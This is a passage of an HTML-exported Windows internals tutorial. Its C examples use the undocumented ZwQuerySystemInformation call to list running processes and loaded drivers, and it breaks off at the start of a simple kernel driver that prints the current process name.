mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>InheritedFromProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>HandleCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE h;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct sss *curr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long rc,ReturnLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curr = malloc(32768);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>h =
LoadLibrary(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pZwQuerySystemInformation
= (qtype)GetProcAddress(h,&quot;ZwQuerySystemInformation&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
pZwQuerySystemInformation(5,curr,32768,&amp;ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;rc=%ld
ReturnLength=%ld curr=%x\n&quot;,rc,ReturnLength,curr);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(curr-&gt;NextEntryDelta
!= 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;%S
curr=%x Delta=%d pid=%d %d Threads=%d
Handles=%d\n&quot;,curr-&gt;ProcessName.Buffer,curr,curr-&gt;NextEntryDelta,curr-&gt;ProcessId,curr-&gt;InheritedFromProcessId,curr-&gt;ThreadCount,curr-&gt;HandleCount);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curr = (struct sss
*)((char *)curr + curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=0
ReturnLength=26744 curr=2f5170<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>(null)
curr=2f5170 Delta=248 pid=0 0 Threads=1 Handles=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>System
curr=2f5268 Delta=2568 pid=8 0 Threads=37 Handles=45<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program simply demonstrates how the task manager uses the
ZwQuerySystemInformation function to get at the list of programs running on the
system. Like before we use the LoadLibrary and GetProcAddress functions to give
us the address of the function. For some reason ntdll.dll has no lib file. We
then call the function though the pointer. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
pass it the value 5 which stands for list of thread and processes. The second
parameter is the address of a buffer which we create, its length and the last
the address of a long which the system comes back and fills it up with the
number of bytes it has copied into our area of memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
our case our linked list of structures is 26744 bytes large. We then use a loop
to display all the processes and other details. We have on purpose not
displayed the details of the threads, if you want copy the code from the
previous program. Thus all programs under windows finally use the
ZwQuerySystemInformation call like we have demonstrated in the above program.
Once again whether there is a device driver that has trapped the original code
is beyond our comprehension.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P48<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>x.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef long
(_stdcall *qtype)(long SystemInformationCLass,void *SystemInformation,long
SystemInformationLength,long * ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
pZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE h;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void *curr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
rc,ReturnLength,mem;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>h =
LoadLibrary(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pZwQuerySystemInformation
= (qtype)GetProcAddress(h,&quot;ZwQuerySystemInformation&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc = -1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>mem = 25000;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while ( rc != 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curr = malloc(mem);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
pZwQuerySystemInformation(5,curr,mem,&amp;ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;mem=%d
rc=%ld ReturnLength=%ld\n&quot;,mem,rc,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>mem = mem+1000;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>mem=25000
rc=-1073741820 ReturnLength=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>mem=26000
rc=0 ReturnLength=25416<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Our
problem with using the function ZwQuerySystemInformation is that we do not know
how much memory is needed by the function. So what we do is use a loop where we
increase the amount of memory allocated passed in the third parameter until the
function returns zero. We set the mem variable to 25,000 and increase it by
1000 each time. This is what we have done in the above program and break out
when the return value stored in rc is 0. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P49<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>x.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#pragma pack(1)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct
_SYSTEM_MODULE_INFORMATION<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">  </span>Reserved[2];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PVOID<span
style="mso-spacerun: yes">  </span>Base;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">  </span>Size;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">  </span>Flags;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>USHORT Index;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>USHORT Unknown;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>USHORT LoadCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>USHORT
ModuleNameOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CHAR<span
style="mso-spacerun: yes">   </span>ImageName[256];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long (_stdcall
*pf)(ULONG SystemInformationClass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int main(void)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE h;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
rc,ReturnLength,mem,*q,i;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PSYSTEM_MODULE_INFORMATION
p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>h =
LoadLibrary(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pf =
GetProcAddress(h,&quot;ZwQuerySystemInformation&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>q = malloc(60000);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pf(11,q,60000,0);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p =
(PSYSTEM_MODULE_INFORMATION)(q + 1);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for (i = 0; i &lt;
*q; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;base:
0x%x size: %u\t%s\n&quot;,p[i].Base,p[i].Size,p[i].ImageName);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return 0;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>base:
0x80400000 size: 1718784<span style='mso-tab-count:1'>       </span>\WINNT\System32\ntoskrnl.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>base:
0x80062000 size: 82176<span style='mso-tab-count:1'>           </span>\WINNT\System32\hal.dll<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>base:
0xeb810000 size: 12288<span style='mso-tab-count:1'>            </span>\WINNT\System32\BOOTVID.DLL<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>base:
0xf88c1000 size: 163840<span style='mso-tab-count:1'>           </span>ACPI.sys<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText style='tab-stops:.5in;mso-layout-grid-align:auto;
text-autospace:ideograph-other'><span style='mso-bidi-font-size:8.0pt;
mso-bidi-font-family:"Times New Roman"'>A long time ago we wrote a program that
displays device drivers on the system. When we call the
ZwQuerySystemInformation with the value 11, we are asking for a list of device
drivers on the system. We are passed a long which if we increase by 1 or 4
actually we point to a structure that looks like SYSTEM_MODULE_INFORMATION a
structure tag that we have defined.. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
is because the pointer we are passed starts with a number that tells us how
many<span style="mso-spacerun: yes">  </span>SYSTEM_MODULE_INFORMATION
structures we have. The actual structures start 4 bytes away. This is because
these structures are not linked to each other unlike the process structures. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
use<span style="mso-spacerun: yes">  </span>a for loop to iterate *q times and
print out the base address of the driver, its size and image name. We use the
array notation instead of increasing the pointer p. Like this we can use the
function ZwQuerySystemInformation to give us a list of lots of things happening
on the system. The trouble is that someone in ring 0 can decide that we see the
wrong things<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P50<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME L&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(pIrp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PKTIMER<span
style='mso-tab-count:1'>         </span>gTimer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PKDPC<span
style='mso-tab-count:1'> </span>gDPCP;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PEPROCESS
curproc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i,offset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*nameptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeCancelTimer(
gTimer );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ExFreePool(
gTimer );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ExFreePool(
gDPCP );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
abc(PKDPC Dpc,PVOID DeferredContext,PVOID sys1,PVOID sys2)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE
pid,tid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curproc
= PsGetCurrentProcess ();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nameptr
= (PCHAR) curproc + offset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= PsGetCurrentProcessId ();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>tid
= PsGetCurrentThreadId ();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
